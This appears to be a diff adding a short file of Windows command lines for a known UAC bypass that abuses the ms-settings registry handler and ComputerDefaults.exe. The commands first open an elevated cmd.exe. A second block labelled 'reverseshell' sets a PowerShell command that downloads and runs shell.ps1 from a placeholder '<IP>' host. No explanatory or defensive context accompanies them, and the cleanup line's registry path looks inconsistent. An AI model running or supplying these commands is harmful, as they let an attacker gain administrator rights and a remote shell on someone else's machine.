@@ -1,0 +1,11 @@
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "cmd.exe" /f
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
+
+ComputerDefaults.exe
+
+reg delete "HKCU\Software\ms-settings" /f
+
+//reverseshell//
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "powershell -nop -c iex(New-Object Net.WebClient).DownloadString('https://<IP>/shell.ps1')" /f
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
+ComputerDefaults
